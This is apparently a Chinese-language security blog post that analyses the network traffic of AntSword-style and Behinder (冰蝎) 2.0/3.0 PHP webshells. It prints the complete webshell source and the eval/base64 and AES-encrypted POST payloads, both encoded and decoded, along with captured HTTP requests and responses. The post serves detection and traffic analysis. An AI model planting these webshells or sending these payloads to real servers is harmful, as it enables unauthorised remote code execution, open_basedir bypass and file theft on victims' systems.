closebckdor=%40eval(%40base64_decode(%24_POST%5B&#x27;e435b616de0459&#x27;%5D))%3B&amp;e435b616de0459=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoIi87fDovIiwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLjE1MzA5NTg5MWJkZCI7QG1rZGlyKCR0bWRpcik7aWYoIUBmaWxlX2V4aXN0cygkdG1kaXIpKXtjb250aW51ZTt9QGNoZGlyKCR0bWRpcik7QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsICIuLiIpOyRjbnRhcnI9QHByZWdfc3BsaXQoIi9cXFxcfFwvLyIsJHRtZGlyKTtmb3IoJGk9MDskaTxzaXplb2YoJGNudGFycik7JGkrKyl7QGNoZGlyKCIuLiIpO307QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTtAcm1kaXIoJHRtZGlyKTticmVhazt9O307O2Z1bmN0aW9uIGFzZW5jKCRvdXQpe3JldHVybiBAYmFzZTY0X2VuY29kZSgkb3V0KTt9O2Z1bmN0aW9uIGFzb3V0cHV0KCl7JG91dHB1dD1vYl9nZXRfY29udGVudHMoKTtvYl9lbmRfY2xlYW4oKTtlY2hvICI1NTFhIi4iYzc1ODAiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gImY1NSIuIjJiZSI7fW9iX3N0YXJ0KCk7dHJ5eyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9CSI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQyIsIloiKWFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9ZWxzZXskUi49Ii8iO30kUi49IgkiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk%2FQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyRzPSgkdSk%2FJHVbIm5hbWUiXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Igl7JHN9IjtlY2hvICRSOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7 url解码后 1bckdor=@eval(@base64_decode($_POST[&#x27;e435b616de0459&#x27;]));&amp;e435b616de0459=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoIi87fDovIiwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLjE1MzA5NTg5MWJkZCI7QG1rZGlyKCR0bWRpcik7aWYoIUBmaWxlX2V4aXN0cygkdG1kaXIpKXtjb250aW51ZTt9QGNoZGlyKCR0bWRpcik7QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsICIuLiIpOyRjbnRhcnI9QHByZWdfc3BsaXQoIi9cXFxcfFwvLyIsJHRtZGlyKTtmb3IoJGk9MDskaTxzaXplb2YoJGNudGFycik7JGkrKyl7QGNoZGlyKCIuLiIpO307QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTtAcm1kaXIoJHRtZGlyKTticmVhazt9O307O2Z1bmN0aW9uIGFzZW5jKCRvdXQpe3JldHVybiBAYmFzZTY0X2VuY29kZSgkb3V0KTt9O2Z1bmN0aW9uIGFzb3V0cHV0KCl7JG91dHB1dD1vYl9nZXRfY29udGVudHMoKTtvYl9lbmRfY2xlYW4oKTtlY2hvICI1NTFhIi4iYzc1ODAiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gImY1NSIuIjJiZSI7fW9iX3N0YXJ0KCk7dHJ5eyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9CSI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQyIsIloiKWFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9ZWxzZXskUi49Ii8iO30kUi49IgkiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyRzPSgkdSk/JHVbIm5hbWUiXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Igl7JHN9IjtlY2hvICRSOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7 解码base部分+代码格式化+分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir = @ini_get(&quot;open_basedir&quot;); //获取用户可访问服务器的目录if ($opdir) &#123; $ocwd = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); //当前文件在服务器的绝对路径，后获取目录部分 $oparr = preg_split(&quot;/;|:/&quot;, $opdir); @array_push($oparr, $ocwd, sys_get_temp_dir()); // foreach($oparr as $item) &#123; //遍历用户可访问服务器的目录，当前文件绝对目录，临时文件目录 if (!@is_writable($item)) &#123; continue; &#125;; $tmdir = $item.&quot;/.153095891bdd&quot;; @mkdir($tmdir); //创建临时目录153095891bdd if (!@file_exists($tmdir)) &#123; continue; &#125; @chdir($tmdir); //改变目录到153095891bdd @ini_set(&quot;open_basedir&quot;, &quot;..&quot;); //将153095891bdd添加到可访问服务器的目录 $cntarr = @preg_split(&quot;/\\\\\\\\|\\//&quot;, $tmdir); for ($i = 0; $i &lt; sizeof($cntarr); $i++) &#123;@ chdir(&quot;..&quot;); &#125;;@ ini_set(&quot;open_basedir&quot;, &quot;/&quot;);@ rmdir($tmdir); break; &#125;;&#125;;;function asenc($out) &#123; return@ base64_encode($out);&#125;;function asoutput() &#123; $output = ob_get_contents(); ob_end_clean(); echo &quot;551a&quot;. &quot;c7580&quot;; echo@ asenc($output); echo &quot;f55&quot;. &quot;2be&quot;;&#125;ob_start();try &#123; $D = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); if ($D == &quot;&quot;) $D = dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]); $R = &quot;&#123;$D&#125; &quot;; if (substr($D, 0, 1) != &quot;/&quot;) &#123; foreach(range(&quot;C&quot;, &quot;Z&quot;) as $L) if (is_dir(&quot;&#123;$L&#125;:&quot;)) $R. = &quot;&#123;$L&#125;:&quot;; &#125; else &#123; $R. = &quot;/&quot;; &#125; $R. = &quot; &quot;; $u = (function_exists(&quot;posix_getegid&quot;)) ? @posix_getpwuid(@posix_geteuid()) : &quot;&quot;; $s = ($u) ? $u[&quot;name&quot;] : @get_current_user(); $R. = php_uname(); $R. = &quot; &#123;$s&#125;&quot;; echo $R;;&#125; catch (Exception $e) &#123; echo &quot;ERROR://&quot;.$e - &gt; getMessage();&#125;;asoutput();die(); Response包 123456789HTTP/1.1 200 OKDate: Thu, 08 Sep 2022 02:43:30 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02X-Powered-By: PHP/5.6.9Connection: closeTransfer-Encoding: chunkedContent-Type: text/html; charset=UTF-8551ac7580RDovcGhwU3R1ZHlfNjQvcGhwc3R1ZHlfcHJvL1dXVy9waHAJQzpEOkU6RjpHOglXaW5kb3dzIE5UIERFU0tUT1AtUkk1OTA2SyA2LjIgYnVpbGQgOTIwMCAoV2luZG93cyA4IEhvbWUgUHJlbWl1bSBFZGl0aW9uKSBBTUQ2NAlyb3lhbA==f552be 命令执行分析 POST包 123456789POST /ma.php HTTP/1.1Host: localhostAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36Content-Type: application/x-www-form-urlencodedContent-Length: 1413Connection: closeb22dda04ada35c=rRRDovcGhwU3R1ZHlfNjQvcGhwc3R1ZHlfcHJvL1dXVy9waHAvLmh0YWNjZXNz&amp;bckdor=%40eval(%40base64_decode(%24_POST%5B&#x27;i999ba0d8875f2&#x27;%5D))%3B&amp;i999ba0d8875f2=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoIi87fDovIiwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLmVlMDgzIjtAbWtkaXIoJHRtZGlyKTtpZighQGZpbGVfZXhpc3RzKCR0bWRpcikpe2NvbnRpbnVlO31AY2hkaXIoJHRtZGlyKTtAaW5pX3NldCgib3Blbl9iYXNlZGlyIiwgIi4uIik7JGNudGFycj1AcHJlZ19zcGxpdCgiL1xcXFx8XC8vIiwkdG1kaXIpO2ZvcigkaT0wOyRpPHNpemVvZigkY250YXJyKTskaSsrKXtAY2hkaXIoIi4uIik7fTtAaW5pX3NldCgib3Blbl9iYXNlZGlyIiwiLyIpO0BybWRpcigkdG1kaXIpO2JyZWFrO307fTs7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuIEBiYXNlNjRfZW5jb2RlKCRvdXQpO307ZnVuY3Rpb24gYXNvdXRwdXQoKXskb3V0cHV0PW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2VjaG8gImI5MTkiLiI1ODVkNiI7ZWNobyBAYXNlbmMoJG91dHB1dCk7ZWNobyAiMGNiIi4iMjNiNyI7fW9iX3N0YXJ0KCk7dHJ5eyRGPWJhc2U2NF9kZWNvZGUoc3Vic3RyKCRfUE9TVFsiYjIyZGRhMDRhZGEzNWMiXSwyKSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpP2ZpbGVzaXplKCRGKTo0MDk2KSk7QGZjbG9zZSgkUCk7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0%2BZ2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs%3D 解密 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657b22dda04ada35c=rRRDovcGhwU3R1ZHlfNjQvcGhwc3R1ZHlfcHJvL1dXVy9waHAvLmh0YWNjZXNz&amp;bckdor=@eval(@base64_decode($_POST[&#x27;i999ba0d8875f2&#x27;]));&amp;i999ba0d8875f2=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir = @ini_get(&quot;open_basedir&quot;);if ($opdir) &#123; $ocwd = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); $oparr = preg_split(&quot;/;|:/&quot;, $opdir);@ array_push($oparr, $ocwd, sys_get_temp_dir()); foreach($oparr as $item) &#123; if (!@is_writable($item)) &#123; continue; &#125;; $tmdir = $item. &quot;/.ee083&quot;;@ mkdir($tmdir); if (!@file_exists($tmdir)) &#123; continue; &#125;@ chdir($tmdir);@ ini_set(&quot;open_basedir&quot;, &quot;..&quot;); $cntarr = @preg_split(&quot;/\\\\\\\\|\\//&quot;, $tmdir); for ($i = 0; $i &lt; sizeof($cntarr); $i++) &#123;@ chdir(&quot;..&quot;); &#125;;@ ini_set(&quot;open_basedir&quot;, &quot;/&quot;);@ rmdir($tmdir); break; &#125;;&#125;;;function asenc($out) &#123; return@ base64_encode($out);&#125;;function asoutput() &#123; $output = ob_get_contents(); ob_end_clean(); echo &quot;b919&quot;. &quot;585d6&quot;; echo@ asenc($output); echo &quot;0cb&quot;. &quot;23b7&quot;;&#125;ob_start();try &#123; $F = base64_decode(substr($_POST[&quot;b22dda04ada35c&quot;], 2)); $P = @fopen($F, &quot;r&quot;); echo(@fread($P, filesize($F) ? filesize($F) : 4096));@ fclose($P);;&#125; catch (Exception $e) &#123; echo &quot;ERROR://&quot;.$e - &gt; getMessage();&#125;;asoutput();die(); 冰蝎2.0流量分析后门这里以冰蝎自带的php webshell进行分析 123456789101112131415161718192021222324252627282930313233&lt;?php@error_reporting(0);session_start();if (isset($_GET[&#x27;pass&#x27;]))&#123; $key=substr(md5(uniqid(rand())),16); $_SESSION[&#x27;k&#x27;]=$key; print $key;&#125;else&#123; $key=$_SESSION[&#x27;k&#x27;]; $post=file_get_contents(&quot;php://input&quot;); if(!extension_loaded(&#x27;openssl&#x27;)) &#123; $t=&quot;base64_&quot;.&quot;decode&quot;; $post=$t($post.&quot;&quot;); for($i=0;$i&lt;strlen($post);$i++) &#123; $post[$i] = $post[$i]^$key[$i+1&amp;15]; &#125; &#125; else &#123; $post=openssl_decrypt($post, &quot;AES128&quot;, $key); &#125; $arr=explode(&#x27;|&#x27;,$post); $func=$arr[0]; $params=$arr[1]; class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125; @call_user_func(new C(),$params);&#125;?&gt; wireshark抓包 连接过程分析会对 Get 传入的pass这个参数进行检查，如果存在的话会以时间的方式生成长度16的随机key，然后存入到session当中，再往后判断是否开启了openssl这个扩展，开启的情况就会开启AES进行解密，得到中间结果字符串 assert|eval(&quot;phpinfo();&quot;) 此数据是由冰蝎加载器发出的，已经定义好的，服务端利用explode函数将拆分为一个字符串数据，然后以可变函数方式调用索引为0的数组元素，参数为索引为1的数组元素，即为 assert(&quot;eval(&quot;phpinfo;&quot;)&quot;)。没有开启的情况，进行异或处理然后通过base64加密。这就是同时在早期有一定的免杀效果，但是这个函数现在已经被标注为危险函数。 第一次get请求 123456GET /shell.php?pass=830 HTTP/1.1Content-type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; Tablet PC 2.0; .NET4.0E)Host: 192.168.124.15Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Connection: keep-alive 1234567891011121314HTTP/1.1 200 OKDate: Thu, 08 Sep 2022 07:15:29 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02X-Powered-By: PHP/5.6.9Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheSet-Cookie: PHPSESSID=oat0ierrkmesft82r8f3cahld0; path=/Keep-Alive: timeout=5, max=100Connection: Keep-AliveTransfer-Encoding: chunkedContent-Type: text/html; charset=UTF-8efc6eabf7e74c052 服务器端产生密钥写入session，session和当前会话绑定。 第二次get请求 123456GET /shell.php?pass=862 HTTP/1.1Content-type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; Tablet PC 2.0; .NET4.0E)Host: 192.168.124.15Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Connection: keep-alive 1234567891011121314HTTP/1.1 200 OKDate: Thu, 08 Sep 2022 07:15:29 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02X-Powered-By: PHP/5.6.9Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheSet-Cookie: PHPSESSID=guos18kll9it96vi1d5pt2hfv3; path=/Keep-Alive: timeout=5, max=99Connection: Keep-AliveTransfer-Encoding: chunkedContent-Type: text/html; charset=UTF-82799e642b49292f5 第二次请求是为了获取key。此时的 2799e642b49292f5就为解密代码的key。 第三次POST请求 post的数据可以利用上面的Key进行解密获得代码，解密网址http://tools.bugscaner.com/cryptoaes/ 123456789101112POST /shell.php HTTP/1.1Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=guos18kll9it96vi1d5pt2hfv3; path=/User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; Tablet PC 2.0; .NET4.0E)Cache-Control: no-cachePragma: no-cacheHost: 192.168.124.15Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Connection: keep-aliveContent-Length: 11124JJ1vgeFtENJjbeFggAdnhHtjfRuRERCT+s+xGLdeFFNHb2FL64aXqppeyKCYKOtMDJ2Q0MkWM0uK78atu2idaEJlhKfrmMYWe4cZNUSp5Ildf4Ssz+NmZ+mm5bCrwTHeTeGuBr+4sMBL/5rba8aQYVNxM9FurbkuCGL22pSQw7S4lq+wbCoPN+BAhTHFfN19bb3JYeYlP3X/gib0Uc+OObKBLjkjVkoBgwxi9G71ynaBeStn59BnmZSuTNWMa5s2YzAkMwmBcKoHjG362MHAJZnetnGolqI8hyoBZW5RUJkVlFEPM+VScUT+ZEe6tNJfmjCHthycvxbDcNLmiwTQhDAH5WtwwAGjt210wkn278dT1TPDy4hbGMYJVCOBnHNoIGHk3DAqeC0YbJHWRRrk50Y7A7uvHhDtGJmvBQc9S9SlhqMG2UKxMUF+KGlYiuchUMP5uvSIABDEQn7rgyHQWW6EGw3n9BOFStEKngzj/xX/Og9s0YpeUUjeza4PCmRtV3fIaj+ZiwBhbUsbJJ25hZMR9W5HcttD/6nxEx95Aj/jV1f8VxCsHN/0+j8GqmLTIo42IHpTxFGVTI/a2T13uPdhAJ3VLzVS36d9hmiwHIpYBhffnt/zWZW2lCxVTw1h5K3TKvmfGfiNr1JJkdLzdhd3AT0Hi/fZHSOOg/2nn/fpBGolYUGOa2s0KUDWjyGBsmXKwTi5gjeFNL+VQDt4QI+Dv921eQ4Z/tzCT/alkoCC1smBkVz8yYAxsWJJin8PON4aT3T9GzilqxkfRDHjDcVu5uInani3Y0f5QSNCSqfA24FXh2gbH3F1p/3RYKdBhwz7g1jESUV0/vb4ulvKFz9jaaS4j6wx8rIcjzCsIXRISwe3/270jWKWZbI7szA7obaNPxXL/0h5ufQL+mkVDd/L2ByfQXofhidjn7dbfLhkDmAkYhCKGY/R84zOUs8+B81wJ7l2grTF4c6jdvT/oJNnjtBVz6D3i5WInCTzBMe2IGreRIx9KZhhGNs48rzyP5EKkqOv/Sx2HJR+9t54xvxXGKDM67NCidH6e6gr37n2HKUIvZ9fsNSDA+xhFKpkVzLoYxmLthnjuQHXB+Gnw== 12345678910111213HTTP/1.1 200 OKDate: Thu, 08 Sep 2022 07:15:29 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02X-Powered-By: PHP/5.6.9Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheKeep-Alive: timeout=5, max=98Connection: Keep-AliveTransfer-Encoding: chunkedContent-Type: text/html; charset=UTF-8Bnd5kIU4J47rBRDDsjLphOLDXZvLCCz7jxHMJr5Et5nRT4dXOImO66RrGr2hl8wf4VtOZadbTvs/8BE1My4QAoG2emIcUrCIDh40VIS25l/oyrLapJB/2y59OPr4AAmb 请求包Aes解密后的数据 1assert|eval(base64_decode(&#x27;QGVycm9yX3JlcG9ydGluZygwKTsNCmZ1bmN0aW9uIG1haW4oJGNvbnRlbnQpDQp7DQoJJHJlc3VsdCA9IGFycmF5KCk7DQoJJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJzdWNjZXNzIik7DQogICAgJHJlc3VsdFsibXNnIl0gPSBiYXNlNjRfZW5jb2RlKCRjb250ZW50KTsNCiAgICAka2V5ID0gJF9TRVNTSU9OWydrJ107DQogICAgZWNobyBlbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCRrZXkpOw0KfQ0KDQpmdW5jdGlvbiBlbmNyeXB0KCRkYXRhLCRrZXkpDQp7DQoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICAJew0KICAgIAkJZm9yKCRpPTA7JGk8c3RybGVuKCRkYXRhKTskaSsrKSB7DQogICAgCQkJICRkYXRhWyRpXSA9ICRkYXRhWyRpXV4ka2V5WyRpKzEmMTVdOyANCiAgICAJCQl9DQoJCQlyZXR1cm4gJGRhdGE7DQogICAgCX0NCiAgICBlbHNlDQogICAgCXsNCiAgICAJCXJldHVybiBvcGVuc3NsX2VuY3J5cHQoJGRhdGEsICJBRVMxMjgiLCAka2V5KTsNCiAgICAJfQ0KfSRjb250ZW50PSI2MDc2YjhjMy04NTJiLTRkOGQtYjg0MS0xYzMxMDNhNWY5NTYiOw0KbWFpbigkY29udGVudCk7&#x27;)); 请求包base64 decode 12345678910111213141516171819202122232425@error_reporting(0);function main($content)&#123; $result = array(); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($content); $key = $_SESSION[&#x27;k&#x27;]; echo encrypt(json_encode($result),$key);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&#x27;openssl&#x27;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;$content=&quot;6076b8c3-852b-4d8d-b841-1c3103a5f956&quot;;main($content); 响应包aes解密 1&#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;NjA3NmI4YzMtODUyYi00ZDhkLWI4NDEtMWMzMTAzYTVmOTU2&quot;&#125;\u000e\u000e\u000e\u000e\u000e\u000e\u000e\u000e\u000e\u000e\u000e\u000e\u000e\u000e 现在很多厂商已经对返回的内容进行匹配。所以这种动态加密的方式会在冰蝎3取消 第四次POST请求 请求体解密,phpinfo() 12345678910111213141516171819202122232425262728293031323334353637383940414243error_reporting(0);function main() &#123; ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean(); $driveList =&quot;&quot;; if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;)) &#123; for($i=65;$i&lt;=90;$i++) &#123; $drive=chr($i).&#x27;:/&#x27;; file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&#x27;&#x27;; &#125; &#125; else &#123; $driveList=&quot;/&quot;; &#125; $currentPath=getcwd(); //echo &quot;phpinfo=&quot;.$info.&quot;\\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\\n&quot;.&quot;driveList=&quot;.$driveList; $osInfo=PHP_OS; $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo)); //echo json_encode($result); session_start(); $key=$_SESSION[&#x27;k&#x27;]; //echo json_encode($result); //echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key); echo encrypt(json_encode($result), $key);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&#x27;openssl&#x27;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;main(); 冰蝎3.0流量分析后门代码与2.0版本相比对密码进行了md5的加密，少了一个响应随机生成16位字符key的功能 1234567891011121314151617181920212223242526&lt;?php@error_reporting(0);session_start(); $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond $_SESSION[&#x27;k&#x27;]=$key; session_write_close(); $post=file_get_contents(&quot;php://input&quot;); if(!extension_loaded(&#x27;openssl&#x27;)) &#123; $t=&quot;base64_&quot;.&quot;decode&quot;; $post=$t($post.&quot;&quot;); for($i=0;$i&lt;strlen($post);$i++) &#123; $post[$i] = $post[$i]^$key[$i+1&amp;15]; &#125; &#125; else &#123; $post=openssl_decrypt($post, &quot;AES128&quot;, $key); &#125; $arr=explode(&#x27;|&#x27;,$post); $func=$arr[0]; $params=$arr[1]; class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125; @call_user_func(new C(),$params);?&gt; wireshark抓包分析 流量分析分析流量发现相比2.0少了动态密钥的获取的请求，aes密钥变为 md5(&quot;pass&quot;)[0:16] 意思就是为32位md5的前16位。全程不再交互密钥生成。一共就俩次请求，第一次请求为判断是否可以建立连接，少了俩次get获取冰蝎动态密钥的行为，第二次发送phpinfo等代码执行，获取网站的信息。 第一次POST请求 1234567891011121314POST /shell.php HTTP/1.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Content-type: application/x-www-form-urlencodedReferer: http://127.0.0.1/A8.phpUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:79.0) Gecko/20100101 Firefox/79.0Cache-Control: no-cachePragma: no-cacheHost: 127.0.0.1Connection: keep-aliveContent-Length: 14323Mn1yNMtoZViV5wotQHPJtwwj0F4b2lyToNK7LfdUnN7zmyQFfx/zaiGwUHg+8SlXZemCLBkDIvxiBIGd6bgOEiZtNpn6YmnWiiaCBNbXkC5JWFTARrD8lCOCQ4ZVFjsJFDaAOwzinbqne/oYuNwWjQvKM9ii2RE/b+Gc+ya2f4+OIDU2Wk/QSIL7GOAoyaUYZSq4bL2wmX5RnP1Lbf7S+TAy3K7JPruBiZeZGC/ay14vUj4+IgmNHwEAzWl3DNIsL1yhH4Do5FI8HwZpG5XnrZwpKdFIEgN4GKmcDODTdO2pj8DVXCwes3m+v/wRykVd++xsex2EkGn9p0SgL+GpXlGg6OlQscedjdgBXv15UyPfJude5BJv+j7cEF7zpdtyAnFYCSqiRX+XD7DNsIUVbU+oamjVwZCgr4L+bbRvs1NfjV6iKKs65VTnlSIbCArJv/w+axR9Gc7Jt9v/GBKckbRjefZGqx7UTKDMahYEBgrwpXrii28q/UerEq/VKFKKeHQuovmpvlx8CblMBkG+rHmhQrP7QVJuzSOUbwdWZpbhys2bufqT6hyOjsu/0sSmHdrzvlZgkRsnsNK0Kv56sesEx9AiwuvgxMh5gAi86uAfhQISoEU5jZNs/T0LiJksv6xddHsDoKSwx+2s74jiNNFh9p0AmUdDloXXvRrfJvCdfaTHnkDEOH6BcSyZj9r53ZKiQUHPh7Sd13x/bk7zcKrUubSplf5cFLc+7m2nSWkXM1Ei7GVkZKBvKorowWkuS0katSgEt3WN00g95HyDfGdxZyUIthJ9hIETiP81O67weGqjFraZfXQUuOHNibydSrZTj/1La6OqSSHoAVnghH9TbYzM4lDdppSZJ1j5eWx8CVn+E8LeCyeROLhKix+P9yJh72FbLOoMFvCurzarkbYZrmQ7Qb0R1oOt2rKNFxY8/itqOSZdk/d2lFkZeT8sbzLmdMQBdSvP/WlvhRdgoYhdkYMfH+2YBJnLuuGgCaXJ0Ky0PpM6+076t6rbiQQQeZNXIMXEBI0Tj3HW3pUzfujkNq9eH0+MYndahOkMTmGSsloL4KLXxuzW2UHOd0giJV1LCFDyY+DlZ/h6mezAzXn7U8m+4uk+5hW3MlS1c3Z5seYa5YUvr/0fJlpswhcRNJCW8cqYNkrvhkx8qDodL6/3cjmjhqQPJEzJJGG